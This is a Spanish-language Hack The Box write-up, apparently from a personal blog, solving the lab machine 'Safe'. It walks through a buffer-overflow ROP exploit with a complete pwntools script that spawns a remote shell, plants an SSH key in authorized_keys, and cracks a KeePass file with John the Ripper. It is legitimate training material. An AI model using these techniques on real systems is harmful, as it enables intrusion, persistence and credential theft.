&#39;b *0x40116e&#39;) # p.recvuntil(&quot;What do you want me to echo back?&quot;) p = remote(&quot;10.10.10.147&quot;, 1337) popR13 = p64(0x401206) system = p64(0x40116e) test = p64(0x401152) junk = (&quot;A&quot;*112).encode() binSh = &quot;/bin/sh\\x00&quot;.encode() nullByte = p64(0x0) p.sendline(junk + binSh + popR13 + system + nullByte + nullByte + test) p.interactive() Al ejecutar nuestro script, lo que vamos a conseguir es una consola, por lo que una vez dentro del sistema, podríamos listar la flag del usuario con bajos privilegios. find / -name user.txt 2&gt; /dev/null Escalada De Privilegios Para conseguir la flag del usuario con máximos privilegios, podemos emepezar por listar el contenido dentro de la carpeta del usuario user. Nos vamos a encontrar con una serie de imágenes, en adición de un archivo de extensión .kdbx, el cual guarda relación con el gestor de contraseñas KeePass. Debido a que nos encontramos en una máquina remota, no podremos visualizar las imágenes alojadas dentro de la máquina víctima, por lo que tenemos que buscar una forma de transferirlas a nuestro equipo. Si recordamos, el puerto 22 estaba abierto, por lo que podríamos conectarnos por SSH a la máquina remota, no obstante, ¿cómo nos vamos a conectar sin proporcionar credenciales? Esto lo haremos introduciendo nuestra clave pública, dentro de un archivo de nombre authorized_keys ubicado en la carpeta .ssh, dentro del directorio del usuario user. Lo primero que haremos será crear un par de claves SSH, una pública, y una privda, esto lo haremos haciendo uso de ssh-key. cd ~/.ssh/ ssh-keygen En caso de querer ingresar algún tipo de contraseña, se lo puede hacer. Ya teniendo el par de claves SSH, vamos a copiar el contenido de nuestra clave pública, para posteiormente añadirla en la ruta /home/user/.ssh/authorized_keys. echo &quot;nuestraClavePública&quot; &gt;&gt; /home/user/.ssh/authorized_keys Una vez hecho esto, podemos conectarnos a través de SSH a la máquina víctima. ssh user@10.10.10.147 En vista de que estamos conectados a la máquina vía SSH, podríamos intentar transferir los archivos del directorio /home/user/, haciendo uso de SCP (Secure Copy Protocol), aunque también pudimos haberlo hecho creando un servidor en la máquina remota mediante Busybox, y posteriormente, descargando las imágnes a través de Wget. scp &quot;user@10.10.10.147:/home/user/*&quot; . Una vez tengamos tanto las imágenes como el archivo MyPasswords.kdbx en nuestro equipo, podemos empezar a analizar que hacer con ello; dudo mucho que las imágenes tengan algo que ver con esteganografía, ya que si abrimos el archivo MyPasswords.kdbx con keepassxc, nos pregunta por un archivo clave. En caso de no contar con keepassxc instalado, podemos hacer lo siguiente: sudo apt install keepassxc Ya en este punto, lo que se nos podría ocurrir sería intentar aplicar fuerza bruta sobre el archivo MyPasswords.kdbx, no obstante, primero tendremos que pasar de formato KeePass, a formato john, para crackear la contraseña haciendo uso de John the Ripper, de modo que usaremos keepass2john. Antes de hacerlo hay que recordar que las imágenes están por algo, para lo cual se las pasaremos como argumento a keepass2john, mediante el parámetro -k. Esto se vería algo así: keepass2john -k &lt;imagenDeseada&gt; MyPasswords.kdbx Esto va a hacer el trabajo, pero podemos reducir tiempo automatizándolo, para ello haremos uso de un bucle for, para ir iterando sobre cada imagen. for image in $(echo &quot;IMG_0545.JPG IMG_0546.JPG IMG_0547.JPG IMG_0548.JPG IMG_0552.JPG IMG_0553.JPG&quot;); do keepass2john -k $image MyPasswords.kdbx; done Utilizar el comando anterior nos sirve, sin embargo, si lo pensamos un poco, si redirigimos este ouput a un fichero hashes.txt, por ejemplo, al cual luego le aplicaremos john, cuando este encuentre la contraseña, nos dirá que la imágen que utilizó fue MyPasswords, lo cual no nos es de ayuda, por lo que podemos reemplazar MyPasswords, por el nombre de la imagen. for image in $(echo &quot;IMG_0545.JPG IMG_0546.JPG IMG_0547.JPG IMG_0548.JPG IMG_0552.JPG IMG_0553.JPG&quot;); do keepass2john -k $image MyPasswords.kdbx | sed &quot;s/MyPasswords/$image/&quot;; done &gt;&gt; nombreArchivo Finalmente, para crackear la contraseña, haremos uso de john en conjunto del diccionario rockyou.txt. En caso de no contar con la herramienta John the Ripper instalada, podemos hacer lo siguiente: sudo apt install john sudo john --wordlist=/dirección/del/diccionario/rockyou.txt nombreArchivo Una vez conseguimos tanto la contraseña como el archivo clave, ya podremos abrir el archivo MyPasswords.kdbx. Y ya con la contraseña del usuario root en nuestro poder, podremos listar la última flag.","headline":"Safe - Hack The Box","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:8000/Safe-Hack-The-Box"},"url":"http://0.0.0.0:8000/Safe-Hack-The-Box"}</script>
<!-- End Jekyll SEO tag -->

</head>


<body>
  <div id="wrapper">
    <header>
  <div>
    <a href="/">
    
    <h1 class="glitch-header">filthyHacker@home:~$</h1>
    </a>
    <div class="header-links">
      <a href="/"><h2 class="header-link">Posts</h2></a>
<a href="/search"><h2 class="header-link">Buscar</h2></a>
<a href="/archive"><h2 class="header-link">Archivo</h2></a>
<a href="/about"><h2 class="header-link">Sobre Mí</h2></a>

    </div>
  </div>
</header>

    <div class="container">
      <section id="main_content">
        <article>
  <h2>Safe - Hack The Box</h2>
  
  <time datetime="2021-12-27T00:00:00-05:00" class="by-line">27 Dic 2021</time>
  <p>Hoy vamos a resolver la máquina <em>Safe</em> de <em>Hack The Box</em>. Es una máquina <em>Linux</em> de nivel de dificultad media en la intrusión, y media en la escalada de privilegios según figura en la plataforma.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/1.png" alt="" /></p>

<h3 id="fase-de-reconocimiento"><a href="#header-3"></a>Fase De Reconocimiento</h3>

<p>Primeramente vamos a lanzar una <em>traza ICMP</em> para saber si la máquina está activa.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.147
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/2.png" alt="" /></p>

<p>Una vez comprobamos que la máquina está activa (pues nos devuelve una respuesta), podemos también determinar a que tipo de máquina nos estamos enfrentando en base al valor del <em>TTL</em>; en este caso el valor del <em>TTL</em> de la máquina es <code class="language-plaintext highlighter-rouge">63</code>, por lo que podemos intuir que estamos ante una máquina <em>Linux</em>. Recordemos que algunos de los valores referenciales son los siguientes:</p>

<table>
  <thead>
    <tr>
      <th style="text-align: left">Sistema Operativo (OS)</th>
      <th style="text-align: left">TTL</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td style="text-align: left">Linux</td>
      <td style="text-align: left">64</td>
    </tr>
    <tr>
      <td style="text-align: left">Windows</td>
      <td style="text-align: left">128</td>
    </tr>
    <tr>
      <td style="text-align: left">Solaris</td>
      <td style="text-align: left">254</td>
    </tr>
  </tbody>
</table>

<p>Si nos damos cuenta, en esta ocasión, el valor del <em>TTL</em> es <code class="language-plaintext highlighter-rouge">63</code> y no <code class="language-plaintext highlighter-rouge">64</code> como indica la tabla anterior, esto se debe a que en el entorno de máquinas de <em>Hack The Box</em>, no nos comunicamos directamente con la máquina a vulnerar, sino que existe un intermediario, por lo que el <em>TTL</em> disminuye en una unidad.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.147 -R                               
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/3.png" alt="" /></p>

<p>Posteriormente, vamos a utilizar la herramienta <em>Nmap</em> para determinar que puertos están abiertos, así como identificar la versión y servicios que corren en el activo. Para determinar que puertos están abiertos podemos realizar lo siguiente:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-T5</span> <span class="nt">-v</span> <span class="nt">-n</span> 10.10.10.147
</code></pre></div></div>

<p>Y en caso de que el escaneo tarde demasiado en completar, tenemos esta otra alternativa:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.147
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de puertos con <em>Nmap</em>:</p>

<ul>
  <li>p - Escanea todo el rango de puertos (65535 en total)</li>
  <li>open - Nos indica todos aquellos puertos que están abiertos (o posiblemente abiertos)</li>
  <li>T5 - La plantilla de temporizado nos permite agilizar nuestro escaneo, este valor puede ir desde 0 hasta 5, cabe aclarar que a mayor sea el valor de la plantilla, “generaremos más ruido”, pero no pasa nada ¿no? Al fin y al cabo estamos practicando en un entorno controlado y aquí somos todos <code class="language-plaintext highlighter-rouge">White Hat</code></li>
  <li>v - <em>Verbose</em>, reporta lo encontrado por consola</li>
  <li>n - No aplicar <em>resolución DNS</em></li>
  <li>sS - Escaneo <em>TCP SYN</em></li>
  <li>min-rate - Emitir paquetes no más lentos que &lt;valor&gt; por segundo</li>
  <li>vvv - Triple <em>verbose</em>, para obtener mayor información por consola</li>
  <li>Pn - No aplicar <em>host discovery</em></li>
</ul>

<p>Una vez hemos detectado los puertos que se encuentran abiertos en el activo, podemos pasar a determinar la versión y servicios que corren bajo estos puertos.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 22,80,1337 10.10.10.147
</code></pre></div></div>

<p>A continuación se explican los parámetros utilizados en el escaneo de versiones y servicios con <em>Nmap</em>:</p>

<ul>
  <li>sC - Scripts básicos de enumeración</li>
  <li>sV - Versión y servicios que corren bajo los puertos encontrados</li>
  <li>p - Especificamos que puertos queremos analizar (los que encontramos abiertos en el paso anterior)</li>
</ul>

<p>Basándonos en la información que nos reporta <em>Nmap</em>, podemos darnos cuenta que la máquina víctima tiene abierto un puerto relacionado con <code class="language-plaintext highlighter-rouge">HTTP</code>; asimismo, encontramos abierto el puerto <code class="language-plaintext highlighter-rouge">1337</code>, relacionado con el protocolo <code class="language-plaintext highlighter-rouge">WASTE</code>, el cual permite el intercambio de archivos de forma cifrada.</p>

<p>Debido a que la máquina cuenta con el puerto <code class="language-plaintext highlighter-rouge">80</code> abierto, podríamos intentar aplicar <code class="language-plaintext highlighter-rouge">fuzzing</code>, no obstante, no vamos a encontrar nada interesante.</p>

<p>Lo siguiente que podemos hacer es determinar ante que nos estamos enfrentando, para ello podemos hacer uso de <code class="language-plaintext highlighter-rouge">WhatWeb</code>, herramienta que se encarga de identificar que tecnologías web se están empleando, véase gestores de contenido (CMS), librerias o plugins, o finalmente el sistema operativo que se está utilizando para alojar el servidor web.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb http://10.10.10.147
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/4.png" alt="" /></p>

<p>Como podemos observar, no hay nada especialmente relevante a excepción del título de la página, el cual es el mensaje por defecto que aparece cuando montamos una página web haciendo uso del servidor <code class="language-plaintext highlighter-rouge">Apache</code>, por lo que podemos irnos haciendo a la idea, de que la entrada a la máquina, no será vía web.</p>

<p>En vista de que ya no nos es posible trabajar desde la terminal, tendremos que visitar estas páginas desde nuestro navegador.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/5.png" alt="" /></p>

<p>En efecto, lo primero que vemos al abrir la página web, es la página por defecto que viene cuando montamos una página web mediante el servidor <code class="language-plaintext highlighter-rouge">Apache</code>, por lo que, podemos inspeccionar el código fuente, en busca de alguna pista; para verlo de manera más cómoda podemos hacer <code class="language-plaintext highlighter-rouge">Ctrl + U</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/6.png" alt="" /></p>

<p>Si nos percatamos, en las primeras líneas del código fuente, hay un comentario que nos menciona que <code class="language-plaintext highlighter-rouge">myapp</code>, alojado en el puerto <code class="language-plaintext highlighter-rouge">1337</code>, lo podemos descargar; para ello, podemos intentar añadir <code class="language-plaintext highlighter-rouge">/myapp</code>, al final del url.</p>

<p><em>Los comentarios en HTML, siempre tienen la siguiente estructura:</em></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!-- Este es un comentario a modo de prueba --&gt;
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/7.png" alt="" /></p>

<p>Al añadir <code class="language-plaintext highlighter-rouge">/myapp</code>, al final del url, se nos va a descargar un archivo que lleva por nombre, <code class="language-plaintext highlighter-rouge">myapp</code>, el cual vamos a empezar a analizar.</p>

<h3 id="fase-de-explotación"><a href="#header-3"></a>Fase De Explotación</h3>

<p>Lo primero que debemos hacer, es saber que es <code class="language-plaintext highlighter-rouge">myapp</code>, para ello podemos usar el comando <code class="language-plaintext highlighter-rouge">file</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>file myapp
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/8.png" alt="" /></p>

<p>Nos damos cuenta de que el archivo <code class="language-plaintext highlighter-rouge">myapp</code>, es un binario, por lo que procederemos a darle permisos de ejecución para saber qué hace:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod 744 myapp
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/9.png" alt="" /></p>

<p>Al ejecutar el binario <code class="language-plaintext highlighter-rouge">myapp</code>, nos reporta por consola la hora actual, además de imprimir el mismo mensaje que introduzcamos; esto no nos es de ayuda, por lo que podríamos intentar extraer las cadenas de caracteres que se encuentran dentro del binario con el comando <code class="language-plaintext highlighter-rouge">strings</code>, sin embargo, no hay nada interesante.</p>

<p>Lo siguiente que podríamos intentar, sería realizar un <code class="language-plaintext highlighter-rouge">Buffer Overflow</code>, para ello, cuándo el binario <code class="language-plaintext highlighter-rouge">myapp</code>, nos pregunte por una cadena de caracteres, debemos ingresar una que sea bastante larga.</p>

<p>Una manera rápida con la cual podemos conseguir cadenas de caracteres cuan largas queramos, sería haciendo uso de <code class="language-plaintext highlighter-rouge">Python</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'print "A"*365'</span>
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/10.png" alt="" /></p>

<p>Si nos percatamos, al introducir nuestra cadena de <em>365 letras A</em>, el binario <code class="language-plaintext highlighter-rouge">myapp</code>, deja de funcionar como debería, esto se debe a un <code class="language-plaintext highlighter-rouge">Segmentation Fault</code> (<em>Fallo de Segmentación</em>), los cuales se dan cuando empezamos a sobrescribir registros. Ahora, ¿por qué se están sobrescribiendo algunos registros?</p>

<p>Cuando el programa <code class="language-plaintext highlighter-rouge">myapp</code>, nos pregunta por una cadena de caracteres, este almacena nuestra respuesta en un bloque de memoria, el <code class="language-plaintext highlighter-rouge">buffer</code>, el cual puede almacenar una cierta cantidad de bytes, la cual de momento desconocemos; si introducimos una cantidad de bytes mayor a la que el buffer estaba diseñado, el programa corrompe.</p>

<p>La pregunta ahora es, ¿a dónde se dirigen estos bytes que están desbordando el <code class="language-plaintext highlighter-rouge">buffer</code>, acaso desaparecen? La respuesta es no, como mencioné, empezamos a sobrescribir registros, de modo que los bytes siguientes a la cantidad máxima de bytes que soporta el buffer, se dirigen al siguiente valor de memoria, y así sucesivamente.</p>

<p>El concepto de <code class="language-plaintext highlighter-rouge">Buffer Overflow</code> puede parecer complejo en un inicio, pero es mucho más fácil de asimilarlo cuando lo visualizamos; para ello, haremos uso de <code class="language-plaintext highlighter-rouge">GDB</code>, herramienta que nos permitirá depurar el binario <code class="language-plaintext highlighter-rouge">myapp</code>. Concretamente estaré haciendo uso de <code class="language-plaintext highlighter-rouge">GEF</code> (<em>GDB Enhanced Features</em>), el cual es una extensión para GDB, así como lo es <code class="language-plaintext highlighter-rouge">PEDA</code> (<em>Python Exploit Development Assistance</em>).</p>

<p>Si queremos instalar <code class="language-plaintext highlighter-rouge">GEF</code>, podemos seguir las instrucciones dadas por la <a href="https://gef.readthedocs.io/en/master/#setup">página oficial</a>, no obstante, en mi caso, esto no me funcionó, por lo que tuve que realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pip3 install capstone unicorn keystone-engine ropper

wget https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/gefInstall.sh
chmod 744 gefInstall.sh
./gefInstall.sh
rm gefInstall.sh
</code></pre></div></div>

<p>Ya con <code class="language-plaintext highlighter-rouge">GEF</code> instalado podemos empezar a depurar el binario <code class="language-plaintext highlighter-rouge">myapp</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb myapp

run
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/11.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/12.png" alt="" /></p>

<p>Algo importante a mencionar, antes de empezar el análisis con <code class="language-plaintext highlighter-rouge">GEF</code>, es que la arquitectura del sistema ante el que nos estamos enfrentando a la hora de explotar <code class="language-plaintext highlighter-rouge">Buffer Overflow</code>, tiene bastante relevancia; en este caso concreto, nos estamos enfrentando ante una máquina de <code class="language-plaintext highlighter-rouge">64 bits</code>, y esto lo podemos saber ya que el nombre de los registros empieza por ‘R’ (<em>RBP, RSP, RIP</em>), en caso de que el sistema fuera de <code class="language-plaintext highlighter-rouge">32 bits</code>, el nombre de los registros empezaría por ‘E’ (<em>EBP, ESP, EIP</em>), no obstante, independientemente de la arquitectura, estos registros se refieren a lo mismo.</p>

<p>Para explotar un <code class="language-plaintext highlighter-rouge">Buffer Overflow</code> satisfactoriamente, existen dos requisitos indispensables, el primero es sobrescribir el registro <em>RIP</em> o <em>EIP</em> (según corresponda), ya que este, apunta a la dirección siguiente a ejecutar, por lo que nos interesa como atacantes redirigir el flujo del programa a nuestro antojo, cabe aclarar que la dirección introducida debe de existir dentro del programa, caso contrario, este corromperá como lo está haciendo ahora mismo; el segundo requisito se refiere a, de qué manera vamos a sobrescribir el registro <code class="language-plaintext highlighter-rouge">RIP</code>, para ello debemos calcular su <em>offset</em>.</p>

<p>Sobre el mensaje <em>Cannot disassemble from $PC</em>, veremos una pequeña flecha que nos indica en que sección, el programa dejó de funcionar, en este caso es en una función de retorno que apunta hacia el registro <code class="language-plaintext highlighter-rouge">RSP</code>, el cual, si nos percatamos, está lleno de <em>letras A</em>; nuestro objetivo ahora es, determinar después de cuántos bytes, empezaremos a sobrescribir el registro <code class="language-plaintext highlighter-rouge">RSP</code>.</p>

<p>Haciendo uso de <code class="language-plaintext highlighter-rouge">GEF</code>, esto es bastante sencillo, ya que lo hará por nosotros, por lo que debemos realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb myapp

pattern create
run
pattern offset $rsp
</code></pre></div></div>
<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/13.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/14.png" alt="" /></p>

<p>Sabemos ahora que, después de ingresar <em>120 bytes</em>, empezaremos a sobrescribir el registro <code class="language-plaintext highlighter-rouge">RSP</code>, y esto lo podemos comprobar de manera sencilla, intentando ingresar en este registro, <em>8 letras B</em>, por ejemplo.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python <span class="nt">-c</span> <span class="s1">'print "A"*120 + "B"*8'</span>
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb myapp

run
</code></pre></div></div>
<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/15.png" alt="" /></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/16.png" alt="" /></p>

<p>En efecto, al ingresar <em>120 bytes</em>, empezamos a sobrescribir el <code class="language-plaintext highlighter-rouge">RSP</code>, ya con esto en mente, debemos verificar que estándares de seguridad se están aplicando sobre el binario, para así determinar que metodología emplearemos para explotarlo; para conocer que seguridades se están aplicando, haremos uso de <code class="language-plaintext highlighter-rouge">checksec</code>, esto podemos hacerlo tanto dentro de <code class="language-plaintext highlighter-rouge">GEF</code>, como fuera de él.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb myapp

checksec
</code></pre></div></div>
<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/17.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>checksec myapp
</code></pre></div></div>
<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/18.png" alt="" /></p>

<p>Podemos observar que el <code class="language-plaintext highlighter-rouge">DEP</code> (<em>Data Execution Prevention</em>), o <code class="language-plaintext highlighter-rouge">NX</code> (<em>No-Execute</em>), está activado; esta protección nos impedirá ejecutar código a través del <em>stack</em>, por lo que no tendrá sentido redirigir el flujo del programa por ahí, por lo que debemos ver, de qué manera, haciendo uso de las mismas posibilidades que nos ofrece el binario <code class="language-plaintext highlighter-rouge">myapp</code>, podemos explotarlo, a este concepto se lo conoce como <code class="language-plaintext highlighter-rouge">ROP</code> (<em>Return Oriented Programming</em>).</p>

<p>Ya en este punto, sabido lo que tenemos que hacer, podemos empezar a aplicar <em>ingeniería inversa</em> sobre el binario, para hacerlo, haremos uso de <code class="language-plaintext highlighter-rouge">Ghidra</code>, una suite de herramientas dedicada a la <em>ingeniería inversa</em>, desarrollada por la <em>NSA</em>.</p>

<p>Para descargar <code class="language-plaintext highlighter-rouge">Ghidra</code>, ingresaremos <a href="https://github.com/NationalSecurityAgency/ghidra/releases">aquí</a>, y descargaremos la versión más reciente.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/19.png" alt="" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>unzip &lt;archivoQueHayamosDescargado&gt;
cd &lt;carpetaQueSeHayaCreado&gt;
./ghidraRun
</code></pre></div></div>

<p>Presionaremos <em>File</em>, <em>New Project</em>, <em>Non-Shared Project</em>, elegiremos un espacio de trabajo, le damos un nombre a nuestro proyecto, presionamos <em>File</em>, <em>Import File</em>, seleccionamos el binario <code class="language-plaintext highlighter-rouge">myapp</code>, arrastramos el binario que acabamos de importar hacia el dragón, y finalmente aceptamos analizar.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/20.png" alt="" /></p>

<p>Ya en este punto podemos empezar a analizar que hay dentro del binario <code class="language-plaintext highlighter-rouge">myapp</code>, por ejemplo, podemos analizar que funciones están definidas, para ello, desplegaremos el menú <em>Functions</em>, que se encuentra al lado izquierdo, podemos empezar por analizar la función <code class="language-plaintext highlighter-rouge">main</code>.
<img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/21.png" alt="" /></p>

<p>Si nos percatamos, esto es lo que encontramos cuando ejecutamos <code class="language-plaintext highlighter-rouge">myapp</code>; nos damos cuenta de que se está definiendo una variable de nombre <code class="language-plaintext highlighter-rouge">local_78</code> que acepta una cierta cantidad de bytes, concretamente, 112, la cual almacena la cadena de caracteres que nos pide ingresar, para posteriormente, volver a mostrarla por pantalla, adicionalmente, se está ejecutando una llamada al sistema para ejecutar el comando <code class="language-plaintext highlighter-rouge">uptime</code>.</p>

<p>Podemos observar dos cosas interesantes, por un lado, se está haciendo uso de la función <code class="language-plaintext highlighter-rouge">gets()</code>, una función considerada insegura, debido principalmente a que esta, no verifica la longitud del buffer, razón por la cual, podemos desbordarlo. Por otra parte, nos damos cuenta de que se está haciendo una llamada al sistema, algo que llama nuestra atención, ya que si lográramos introducir un comando diferente a <code class="language-plaintext highlighter-rouge">uptime</code>, podríamos conseguir una consola dentro de la máquina víctima.</p>

<p>Pero, ¿cómo introducimos un comando si el programa ya está compilado? La respuesta está en la función <code class="language-plaintext highlighter-rouge">test</code>, y el concepto de <code class="language-plaintext highlighter-rouge">ROP</code>.</p>

<p>No obstante, vamos a analizar el binario <code class="language-plaintext highlighter-rouge">myapp</code>, una vez más, con la diferencia de que vamos a empezar a automatizar lo que vamos a hacer, pues ya tenemos una idea clara de por donde van los tiros. Para ello, podemos crear un script en <code class="language-plaintext highlighter-rouge">Python</code>, para lo cual empezaremos por colocar la cabecera de <code class="language-plaintext highlighter-rouge">Python 3</code>, importar la librería <code class="language-plaintext highlighter-rouge">pwntools</code>, y definir tanto la <em>arquitectura</em> como el <em>sistema operativo</em> de la máquina víctima, adicionalmente, podemos definir que tipo de terminal queremos emplear para poder trabajar más a gusto.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'gnome-terminal'</span><span class="p">,</span> <span class="s">'-x'</span><span class="p">]</span>
<span class="n">context</span><span class="p">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'amd64'</span>
<span class="n">context</span><span class="p">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
</code></pre></div></div>

<p>En caso de no contar con la librería <code class="language-plaintext highlighter-rouge">pwntools</code>, podemos hacer lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
python3 -m pip install --upgrade pip
python3 -m pip install --upgrade pwntools
</code></pre></div></div>

<p>Una vez definida la base del script, podemos empezar a trabajar. Nos interesa saber en que registro, se está almacenando el comando <code class="language-plaintext highlighter-rouge">uptime</code>, para lo cual, empezaremos por definir un proceso, el cual será la depuración del binario, añadiremos un <em>breakpoint</em> en la dirección donde se hace la llamada al sistema, y, adicional a ello, indicaremos al script que nos espere hasta escribir algo después de <em>What do you want me to echo back?</em>, caso contrario, el script se cerrará.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">p</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">debug</span><span class="p">(</span><span class="s">'/ubicación/del/binario/myapp'</span><span class="p">,</span> <span class="s">'b *0x40116e'</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"What do you want me to echo back?"</span><span class="p">)</span>
</code></pre></div></div>

<p>La dirección de la llamada al sistema, la podemos sacar de <code class="language-plaintext highlighter-rouge">Ghidra</code>:</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/22.png" alt="" /></p>

<p>Ejecutamos nuestro script, no sin antes haberle asignado los permisos correspondientes:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod 744 &lt;nuestroScript.py&gt;
</code></pre></div></div>

<p>En este punto podemos presionar la tecla <code class="language-plaintext highlighter-rouge">c</code>, para continuar, y nos daremos cuenta que el comando <code class="language-plaintext highlighter-rouge">uptime</code>, está siendo almacenado en el registro <code class="language-plaintext highlighter-rouge">RDI</code>.</p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/23.png" alt="" /></p>

<p>En este punto, tenemos que buscar una forma de sobrescribir el registro <code class="language-plaintext highlighter-rouge">RDI</code>, y la clave está en la función <code class="language-plaintext highlighter-rouge">test</code></p>

<p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-12-27-Safe-Hack-The-Box/24.png" alt="" /></p>

<p>Si nos percatamos, en la dirección <code class="language-plaintext highlighter-rouge">0x401156</code>, el contenido que se encuentra en el registro <code class="language-plaintext highlighter-rouge">RSP</code>, está siendo almacenado en el registro <code class="language-plaintext highlighter-rouge">RDI</code>; ¿cuándo almacenábamos las <em>8 letras B</em>, en qué registro las estábamos almacenando? Exacto, en <code class="language-plaintext highlighter-rouge">RSP</code>, por lo que ahora, debemos de buscar una forma en la que poder redirigir el flujo del programa a través de la función <code class="language-plaintext highlighter-rouge">test</code>, para que cuando esta termine, podamos ejecutar el comando que deseemos.</p>

